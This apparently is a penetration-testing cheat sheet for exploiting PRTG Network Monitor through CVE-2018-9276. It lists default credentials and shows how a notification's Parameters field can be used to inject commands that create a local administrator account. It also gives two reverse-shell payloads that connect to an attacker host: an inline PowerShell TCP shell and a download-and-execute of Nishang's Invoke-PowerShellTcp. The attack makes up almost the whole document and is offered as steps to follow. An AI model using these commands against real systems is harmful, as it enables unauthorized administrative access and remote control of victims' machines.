- Default Credentials: `prtgadmin:prtgadmin`, `prtgadmin:Password123`
- check version `curl -s http://$VICTIM_IP:8080/index.htm | grep "prtgversion"`


## <span style="color:#8BE9FD">Exploitation (Authenticated RCE - CVE-2018-9276)</span>

#### <span style="color:#FFB86C">Step 1:</span>
- Login - Use default creds (prtgadmin:prtgadmin or bruteforce).

#### <span style="color:#FFB86C">Step 2: Create Malicious Notificatio</span>
- Navigate to: `Setup → Account Settings → Notifications → Add Notification`
- Configure:
    - Name: Pwned
    - Execute Program: Demo exe notification - outfile.ps1
    - Parameters:
        ```powershell
        test.txt;net user prtgadm Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm /add
        Click Test → Executes command.
        ```
- Click Test → Executes command.
#### <span style="color:#FFB86C">Step 3: Verify Admin Access</span>
```bash
nxc smb $VICTIM_IP -u $USER -p $PASS

# Expected Output:
[+] $VICTIM_IP\prtgadm:Pwn3d_by_PRTG! (Pwn3d!)
```

## <span style="color:#8BE9FD">Reverse Shell (Alternative to Adding User)</span>
#### <span style="color:#FFB86C">Method 1: PowerShell Reverse Shell</span>
```PowerShell
test.txt;powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
#### <span style="color:#FFB86C">Method 2: Nishang Reverse Shell</span>
- Upload `Invoke-PowerShellTcp.ps1
- Execute
```powershell
test.txt;powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://$ATTACKER_IP/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IP $ATTACKER_IP -Port 4444"
```

 
